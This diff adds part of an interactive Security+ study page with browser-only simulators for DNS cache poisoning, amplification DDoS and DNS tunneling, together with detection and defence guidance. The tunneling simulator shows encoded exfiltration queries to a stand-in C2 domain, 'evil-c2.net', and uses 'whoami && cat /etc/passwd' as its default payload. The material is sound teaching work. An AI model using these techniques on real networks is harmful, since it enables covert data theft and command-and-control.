+      </div>
+    </div>
+
+    <div class="full" style="display:flex;justify-content:space-between;">
+      <button class="btn" onclick="goPhase(1)">← BACK</button>
+      <button class="btn primary" onclick="goPhase(3)">NEXT: TUNNELING →</button>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════════════════
+       PHASE 3 — DNS TUNNELING
+  ══════════════════════════════════════════════════ -->
+  <div class="phase" id="phase3">
+
+    <div class="card purple">
+      <div class="card-title"><span class="dot"></span>WHAT IS DNS TUNNELING?</div>
+      <p class="concept"><strong>DNS tunneling</strong> encodes arbitrary data inside DNS query and response packets — using the DNS protocol as a covert communication channel. Because most firewalls and proxies allow outbound DNS traffic, attackers use tunneling to <strong>exfiltrate data</strong> or maintain <strong>command-and-control (C2)</strong> communication even in heavily firewalled environments.</p>
+      <p class="concept">The attacker controls an authoritative nameserver for a domain they own (e.g., <code>evil.com</code>). Data is encoded in subdomains of queries (<code>aGVsbG8.evil.com</code>) — those queries flow through the corporate DNS resolver to the attacker's NS server, which decodes the payload. Responses carry data back the same way.</p>
+      <div class="callout purple">
+        <strong>Common tools:</strong> iodine, dnscat2, dns2tcp. Used in red team engagements, APT C2 infrastructure, and data theft from air-gapped or heavily filtered networks. Detectable by behavioral analysis — not packet content.
+      </div>
+    </div>
+
+    <div class="card blue">
+      <div class="card-title"><span class="dot"></span>HOW TUNNELING WORKS</div>
+
+      <div style="margin-bottom:14px;">
+        <div class="packet-row" style="margin-bottom:6px;">
+          <div class="pkt atk">Infected Host</div>
+          <div class="pkt-arrow">→</div>
+          <div class="pkt dns">Corp DNS Resolver</div>
+          <div class="pkt-label">Query: <span style="color:var(--purple);">aGVsbG8ud29ybGQ.evil.com TXT</span></div>
+        </div>
+        <div class="packet-row" style="margin-bottom:6px;">
+          <div class="pkt dns">Corp DNS Resolver</div>
+          <div class="pkt-arrow">→</div>
+          <div class="pkt atk">evil.com Auth NS</div>
+          <div class="pkt-label">Forwards query (allowed — it's just DNS)</div>
+        </div>
+        <div class="packet-row" style="margin-bottom:6px;">
+          <div class="pkt atk">evil.com Auth NS</div>
+          <div class="pkt-arrow">→</div>
+          <div class="pkt dns">Corp DNS Resolver</div>
+          <div class="pkt-label">TXT response: <span style="color:var(--purple);">Y21kOnJlYm9vdA==</span> (cmd: reboot)</div>
+        </div>
+        <div class="packet-row">
+          <div class="pkt dns">Corp DNS Resolver</div>
+          <div class="pkt-arrow">→</div>
+          <div class="pkt atk">Infected Host</div>
+          <div class="pkt-label">Receives command — executes</div>
+        </div>
+      </div>
+
+      <div class="callout blue">
+        <strong>Why TXT records?</strong> TXT records can hold up to 255 bytes of arbitrary text per string, and up to 65,535 bytes total in a single response. They're the preferred carrier for tunneling payloads. CNAME and NULL records are also used.
+      </div>
+    </div>
+
+    <div class="full">
+      <div class="card pink">
+        <div class="card-title"><span class="dot"></span>INTERACTIVE — DNS TUNNEL SIMULATOR</div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:28px;">
+          <div>
+            <p class="concept" style="margin-bottom:14px;">Simulate encoding data into DNS queries the way dnscat2 or iodine would. Type a command or data payload — watch it get Base64-encoded into subdomains and decoded on the attacker's NS server.</p>
+
+            <label>ATTACKER C2 DOMAIN</label>
+            <input type="text" id="c2Domain" value="evil-c2.net" />
+
+            <label>DATA / COMMAND TO EXFILTRATE</label>
+            <input type="text" id="tunnelPayload" value="whoami && cat /etc/passwd" />
+
+            <label>ENCODING METHOD</label>
+            <select id="encodingMethod">
+              <option value="base64">Base64 (subdomain encoding)</option>
+              <option value="hex">Hex encoding</option>
+            </select>
+
+            <div class="btn-row">
+              <button class="btn purple-btn" onclick="runTunnel()">⚡ SEND THROUGH DNS TUNNEL</button>
+              <button class="btn" onclick="resetTunnel()">↺ RESET</button>
+            </div>
+
+            <div style="margin-top:16px;">
+              <label>FIREWALL RULES (simulated)</label>
+              <div class="terminal" style="font-size:10px;line-height:1.9;">
+                <span class="t-red">BLOCK</span>  <span class="t-dim">outbound TCP 80,443 (no internet)</span><br>
+                <span class="t-red">BLOCK</span>  <span class="t-dim">outbound TCP 22,23,25 (no SSH/SMTP)</span><br>
+                <span class="t-green">ALLOW</span>  <span class="t-dim">outbound UDP 53 → corp-resolver (DNS)</span><br>
+                <span class="t-green">ALLOW</span>  <span class="t-dim">corp-resolver → upstream resolvers</span><br>
+                <span class="t-dim">// DNS traffic passes freely — tunnel exploits this</span>
+              </div>
+            </div>
+          </div>
+
+          <div>
+            <label>ENCODED DNS QUERY (what the wire sees)</label>
+            <div class="terminal" id="tunnelQueryDisplay" style="word-break:break-all;min-height:60px;">
+              <span class="t-dim">// Run simulation to see encoded query...</span>
+            </div>
+
+            <div style="margin-top:12px;">
+              <label>ATTACKER NS SERVER — DECODED PAYLOAD</label>
+              <div class="terminal" id="tunnelDecodeDisplay" style="min-height:60px;">
+                <span class="t-dim">// Attacker's NS receives query and decodes...</span>
+              </div>
+            </div>
+
+            <div style="margin-top:12px;">
+              <label>EXFILTRATION STREAM</label>
+              <div class="terminal scrollable" id="tunnelLog">
+                <span class="t-dim">// DNS tunnel session log</span><br>
+                <span class="t-dim">// Monitoring for suspicious subdomain patterns...</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div style="margin-top:20px;">
+          <label>DETECTION — WHAT MAKES DNS TUNNELING STAND OUT</label>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
+            <div style="border:1px solid var(--red-dim);padding:12px;background:rgba(255,62,62,0.04);">
+              <div style="font-family:var(--ui);font-weight:700;color:var(--red);margin-bottom:8px;font-size:12px;">⚠ BEHAVIORAL ANOMALIES</div>
+              <div class="terminal" style="font-size:10px;line-height:1.9;">
+                <span class="t-red">HIGH</span> query volume to single domain<br>
+                <span class="t-red">LONG</span> subdomain strings (>30 chars)<br>
+                <span class="t-red">HIGH</span> entropy in subdomain labels<br>
+                <span class="t-red">TXT</span> queries unusually frequent<br>
+                <span class="t-red">NXDOMAIN</span> storm during setup<br>
+                <span class="t-red">PATTERN</span> of periodic beaconing
+              </div>
+            </div>
+            <div style="border:1px solid var(--green-dim);padding:12px;background:rgba(0,214,143,0.04);">
+              <div style="font-family:var(--ui);font-weight:700;color:var(--green);margin-bottom:8px;font-size:12px;">✓ DEFENSIVE CONTROLS</div>
+              <div class="terminal" style="font-size:10px;line-height:1.9;">
+                <span class="t-green">DNS RPZ</span> — block known C2 domains<br>
+                <span class="t-green">DLP</span> — monitor query entropy/length<br>
+                <span class="t-green">SIEM</span> — alert on TXT query spikes<br>
+                <span class="t-green">DNS FIREWALL</span> — filter suspicious TLDs<br>
+                <span class="t-green">RESTRICT</span> hosts that can query DNS<br>
+                <span class="t-green">LOG ALL</span> DNS traffic for forensics
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="divider">COMPARISON — ALL THREE ATTACKS</div>
+        <div style="overflow-x:auto;">
+          <table class="dns-table" style="font-size:11px;">
+            <thead>
+              <tr>
+                <th>ATTACK</th>
+                <th>GOAL</th>
+                <th>MECHANISM</th>
+                <th>VICTIM</th>
+                <th>KEY DEFENSE</th>
+                <th>EXAM TAG</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr class="legit">
+                <td style="color:var(--cyan);">Cache Poisoning</td>
+                <td>Redirect traffic / phishing</td>
+                <td>Inject forged DNS records into resolver cache</td>
+                <td>End users of poisoned resolver</td>
+                <td style="color:var(--green);">DNSSEC</td>
+                <td><span class="tag cyan">SPOOFING</span></td>
+              </tr>
+              <tr class="legit">
+                <td style="color:var(--amber);">Amplification</td>
+                <td>DDoS / bandwidth flood</td>
+                <td>Spoof src IP, abuse open resolvers as amplifiers</td>
+                <td>Any internet-connected host</td>
+                <td style="color:var(--green);">BCP38 / RRL</td>
+                <td><span class="tag amber">DDoS</span></td>
+              </tr>
+              <tr class="legit">
+                <td style="color:var(--purple);">Tunneling</td>
+                <td>C2 / data exfiltration</td>
+                <td>Encode data in DNS subdomains, own auth NS decodes</td>
+                <td>Defended/airgapped network</td>
+                <td style="color:var(--green);">DNS monitoring / RPZ</td>
+                <td><span class="tag purp">EXFIL/C2</span></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="callout cyan" style="margin-top:16px;">
+          <strong>Security+ exam tips:</strong> Know DNSSEC as the primary cache poisoning fix. Know BCP38 (ingress filtering) and closing open resolvers for amplification. For tunneling, the detection vector is behavioral — query length/entropy/volume — not content inspection. All three are considered network-layer attacks that bypass traditional application-layer controls.
+        </div>
+      </div>
+    </div>
+
+    <div class="full" style="display:flex;justify-content:flex-start;">
+      <button class="btn" onclick="goPhase(2)">← BACK</button>
+    </div>
+  </div>
+
+</div>
+
+<!-- MODAL -->
+<div class="modal-overlay" id="modal">
+  <div class="modal">
+    <div class="modal-title" id="modalTitle">DNS ATTACK</div>
+    <div class="modal-body" id="modalBody"></div>
+    <button class="btn primary" onclick="closeModal()">CLOSE</button>
+  </div>
+</div>
+
+<script>
+// ── NAVIGATION ────────────────────────────────────────────────
+function goPhase(n) {
+  document.querySelectorAll('.phase').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.phase-btn').forEach((b, i) => {
+    b.classList.remove('active','done');
+    if (i + 1 < n) b.classList.add('done');
+  });
+  document.getElementById('phase' + n).classList.add('active');
+  document.querySelectorAll('.phase-btn')[n - 1].classList.add('active');
+  const pcts = ['33.3','66.6','100'];
+  document.getElementById('progressFill').style.width = pcts[n-1] + '%';
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+// ── HELPERS ───────────────────────────────────────────────────
+function esc(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function addLog(id, cls, msg) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  const ts = new Date().toTimeString().slice(0,8);
+  el.innerHTML += `<div><span class="t-ts">[${ts}]</span> <span class="${cls}">${esc(msg)}</span></div>`;
+  el.scrollTop = el.scrollHeight;
+}
+
+function showModal(title, body) {
+  document.getElementById('modalTitle').textContent = title;
+  document.getElementById('modalBody').innerHTML = body.replace(/\n/g,'<br>');
+  document.getElementById('modal').classList.add('show');
+}
+
+function closeModal() { document.getElementById('modal').classList.remove('show'); }
+
+// ── PHASE 1: CACHE POISONING ──────────────────────────────────
+let poisonRunning = false;
+
+function runPoisonAttack() {
+  if (poisonRunning) return;
+  poisonRunning = true;
+
+  const domain  = document.getElementById('poisonDomain').value.trim() || 'secure-bank.com';
+  const evilIP  = document.getElementById('poisonIP').value.trim() || '192.168.66.66';
+  const mode    = document.getElementById('txidMode').value;
+  const logEl   = document.getElementById('poisonLog');
+  const outcome = document.getElementById('poisonOutcome');
+
+  logEl.innerHTML = '';
+  outcome.className = 'outcome active';
+  outcome.textContent = 'Racing legitimate authoritative server...';
+
+  const steps = [
+    ['t-dim', `Resolver receives query: ${domain} A`],
+    ['t-cyan', `Resolver sends upstream query → auth-ns.${domain} (TXID: ${mode === 'sequential' ? '0x0004' : '0x' + Math.floor(Math.random()*65535).toString(16).padStart(4,'0')})`],
+    ['t-amber', `Attacker detects query — flooding ${mode === 'sequential' ? 'sequential' : 'random'} TXIDs with forged responses...`],
+  ];
+
+  if (mode === 'sequential') {
+    steps.push(['t-red', 'TXID predicted — attacker wins the race!']);
+    steps.push(['t-red', `Forged response accepted: ${domain} → ${evilIP}`]);
+    steps.push(['t-red', `Real authoritative response arrives — too late, cache already updated`]);
+    steps.push(['t-red', `Cache POISONED. All clients querying this resolver now directed to ${evilIP}`]);
+  } else {
+    steps.push(['t-green', 'TXID randomized — attacker cannot predict value']);
+    steps.push(['t-green', 'Forged responses rejected (TXID mismatch)']);
+    steps.push(['t-green', 'Legitimate authoritative response accepted']);
+    steps.push(['t-green', 'Cache remains clean. Attack failed.']);
+  }
+
+  let i = 0;
+  const iv = setInterval(() => {
+    if (i < steps.length) {
+      addLog('poisonLog', steps[i][0], steps[i][1]);
+      i++;
+    } else {
+      clearInterval(iv);
+      poisonRunning = false;
+      if (mode === 'sequential') {
+        // update cache table
+        document.getElementById('cacheStatus').textContent = 'POISONED';
+        document.getElementById('cacheStatus').style.color = 'var(--red)';
+        const tbody = document.getElementById('cacheTbody');
+        const rows  = tbody.querySelectorAll('tr');
+        rows.forEach(r => {
+          if (r.cells[0].textContent === domain) {
+            r.className = 'poisoned new';
+            r.cells[2].textContent = evilIP;
+            r.cells[4].textContent = 'ATTACKER';
+          }
+        });
+        outcome.className = 'outcome attack';
+        outcome.innerHTML = `⚠ ATTACK SUCCEEDED — ${domain} poisoned<br>All clients → ${evilIP} (attacker's server)<br>TTL-based persistence until cache expires`;
+      } else {
+        outcome.className = 'outcome defend';
+        outcome.innerHTML = `🛡 ATTACK FAILED — TXID randomization prevented injection<br>Cache remains clean. Legitimate record preserved.`;
+      }
+    }
+  }, 280);
+}
+
+function resetPoison() {
+  poisonRunning = false;
+  document.getElementById('cacheStatus').textContent = 'CLEAN';
+  document.getElementById('cacheStatus').style.color = 'var(--green)';
+  document.getElementById('cacheTbody').innerHTML = `
+    <tr class="legit"><td>google.com</td><td>A</td><td>142.250.80.46</td><td>300s</td><td>auth-ns</td></tr>
+    <tr class="legit"><td>cloudflare.com</td><td>A</td><td>104.16.124.96</td><td>300s</td><td>auth-ns</td></tr>
+    <tr class="legit"><td>secure-bank.com</td><td>A</td><td>203.0.113.42</td><td>300s</td><td>auth-ns</td></tr>`;
+  document.getElementById('poisonLog').innerHTML = '<span class="t-dim">// Cache reset. Ready for new simulation.</span>';
+  document.getElementById('poisonOutcome').className = 'outcome';
+  document.getElementById('poisonOutcome').textContent = 'Run the attack to see the result...';
+}
+
+// ── PHASE 2: AMPLIFICATION ────────────────────────────────────
+function calcAmp() {
+  const [qSize, rSize] = document.getElementById('queryType').value.split(',').map(Number);
+  const factor = Math.round(rSize / qSize);
+  const resolvers = parseInt(document.getElementById('resolverCount').value) || 5000;
+  const bwMbps = parseInt(document.getElementById('attackerBw').value) || 100;
+  const qps = Math.round((bwMbps * 1e6 / 8) / qSize);
+  const attackGbps = (qps * resolvers * rSize / 1e9).toFixed(1);
+
+  document.getElementById('statAmpFactor').textContent = factor + '×';
+  document.getElementById('statAttackGbps').textContent = attackGbps + ' Gbps';
+  document.getElementById('statQps').textContent = (qps / 1000).toFixed(0) + 'K/s';
+  return { factor, qps, attackGbps: parseFloat(attackGbps), resolvers, bwMbps, qSize, rSize };
+}
+
+let ampAnimating = false;
+
+function launchAmp() {
+  if (ampAnimating) return;
+  const stats = calcAmp();
+  ampAnimating = true;
+
+  const outcome = document.getElementById('ampOutcome');
+  const meter   = document.getElementById('victimMeter');
+  const mLabel  = document.getElementById('meterLabel');
+
+  outcome.className = 'outcome active';
+  outcome.textContent = `Flooding ${stats.resolvers.toLocaleString()} open resolvers...`;
+  document.getElementById('ampLog').innerHTML = '';
+
+  addLog('ampLog', 't-dim', `Attack initiated: ${stats.resolvers.toLocaleString()} resolvers × ${stats.qSize}B queries`);
+  addLog('ampLog', 't-amber', `Query type: ANY — amplification factor ${stats.factor}×`);
+
+  let pct = 0;
+  const target = Math.min((stats.attackGbps / 100) * 100, 100);
+  const iv = setInterval(() => {
+    pct = Math.min(pct + 3, target);
+    meter.style.width = pct + '%';
+    mLabel.textContent = ((pct / 100) * stats.attackGbps).toFixed(1) + ' Gbps';
+    if (pct >= target) {
+      clearInterval(iv);
+      ampAnimating = false;
+      addLog('ampLog', 't-red', `Attack volume: ${stats.attackGbps} Gbps hitting victim`);
+      addLog('ampLog', 't-red', `${stats.resolvers.toLocaleString()} resolvers acting as unwitting amplifiers`);
+      if (stats.attackGbps > 10) {
+        addLog('ampLog', 't-red', 'Victim bandwidth exhausted — service OFFLINE');
+        outcome.className = 'outcome attack';
+        outcome.innerHTML = `⚠ DDoS SUCCESSFUL — ${stats.attackGbps} Gbps flood<br>Attacker used ${stats.bwMbps} Mbps → produced ${stats.attackGbps} Gbps (${stats.factor}× amplification)<br>Victim's upstream link saturated — service unreachable`;
+      } else {
+        addLog('ampLog', 't-green', 'Traffic volume manageable — victim may sustain');
+        outcome.className = 'outcome defend';
+        outcome.innerHTML = `Attack volume (${stats.attackGbps} Gbps) may be within scrubbing capacity.<br>Increase resolvers or bandwidth for a more severe simulation.`;
+      }
+    }
+  }, 40);
+}
+
+function resetAmp() {
+  ampAnimating = false;
+  document.getElementById('victimMeter').style.width = '0%';
+  document.getElementById('meterLabel').textContent = '0 Gbps';
+  document.getElementById('ampLog').innerHTML = '<span class="t-dim">// Simulation reset.</span>';
+  document.getElementById('ampOutcome').className = 'outcome';
+  document.getElementById('ampOutcome').textContent = 'Configure parameters above and click SIMULATE ATTACK.';
+  calcAmp();
+}
+
+// ── PHASE 3: TUNNELING ────────────────────────────────────────
+function btoa_safe(str) {
+  try { return btoa(unescape(encodeURIComponent(str))); } catch(e) { return btoa(str); }
+}
+
+function toHex(str) {
+  return Array.from(str).map(c => c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
+}
+
+function runTunnel() {
+  const domain  = document.getElementById('c2Domain').value.trim() || 'evil-c2.net';
+  const payload = document.getElementById('tunnelPayload').value.trim() || 'hello';
+  const method  = document.getElementById('encodingMethod').value;
+
+  const encoded = method === 'base64' ? btoa_safe(payload) : toHex(payload);
+  // chunk into subdomain-safe labels (max 63 chars each)
+  const chunks = encoded.match(/.{1,40}/g) || [encoded];
+  const subdomain = chunks[0];
+  const fqdn = `${subdomain}.${domain}`;
+
+  // query display
+  document.getElementById('tunnelQueryDisplay').innerHTML =
+    `<span class="t-purple">dig TXT ${esc(fqdn)}</span><br>
+<span class="t-dim">;; Query section:</span><br>
+<span class="t-white">QNAME: </span><span class="t-purple">${esc(fqdn)}</span><br>
+<span class="t-white">TYPE:  </span><span class="t-cyan">TXT</span><br>
+<span class="t-white">TXID:  </span><span class="t-amber">0x${Math.floor(Math.random()*65535).toString(16).padStart(4,'0')}</span><br>
+<span class="t-dim">;; Traverses corporate firewall (UDP 53 allowed)</span>`;
+
+  // decode display (attacker NS receives)
+  const cmdResponse = btoa_safe('ack:ok:' + Math.floor(Math.random()*9999));
+  document.getElementById('tunnelDecodeDisplay').innerHTML =
+    `<span class="t-dim">;; Attacker NS received query for ${esc(fqdn)}</span><br>
+<span class="t-green">DECODED (${method}): </span><span class="t-white">${esc(payload)}</span><br>
+<span class="t-dim">;; Sending TXT response (C2 command back):</span><br>
+<span class="t-purple">TXT: "${esc(cmdResponse)}"</span> <span class="t-dim">← encoded ACK</span>`;
+
+  // log
+  document.getElementById('tunnelLog').innerHTML = '';
+  const logs = [
+    ['t-dim',    `Session initiated: ${domain}`],
+    ['t-purple', `Encoding payload with ${method}: "${payload}"`],
+    ['t-purple', `Encoded: ${encoded.slice(0,40)}${encoded.length>40?'...':''}`],
+    ['t-amber',  `DNS query: ${fqdn.slice(0,60)} → corp resolver`],
+    ['t-dim',    `Corp resolver forwards to attacker NS (firewall allows UDP 53)`],
+    ['t-green',  `Attacker NS decoded payload: "${payload}"`],
+    ['t-purple', `Attacker responds with TXT: ${cmdResponse.slice(0,30)}...`],
+    ['t-green',  `Client decoded response — tunnel active`],
+    ['t-red',    `Data exfiltrated. C2 channel established through DNS.`],
+  ];
+
+  let i = 0;
+  const iv = setInterval(() => {
+    if (i < logs.length) { addLog('tunnelLog', logs[i][0], logs[i][1]); i++; }
+    else { clearInterval(iv); }
+  }, 220);
+
+  if (chunks.length > 1) {
+    setTimeout(() => {
+      addLog('tunnelLog', 't-dim', `Note: full payload would be chunked into ${chunks.length} sequential queries`);
+    }, logs.length * 220 + 100);
+  }
+}
+
+function resetTunnel() {
+  document.getElementById('tunnelQueryDisplay').innerHTML = '<span class="t-dim">// Run simulation to see encoded query...</span>';
+  document.getElementById('tunnelDecodeDisplay').innerHTML = '<span class="t-dim">// Attacker\'s NS receives query and decodes...</span>';
+  document.getElementById('tunnelLog').innerHTML = '<span class="t-dim">// DNS tunnel session log</span><br><span class="t-dim">// Monitoring for suspicious subdomain patterns...</span>';
+}
+
+// init calc
+calcAmp();
+</script>
+</body>
+</html>
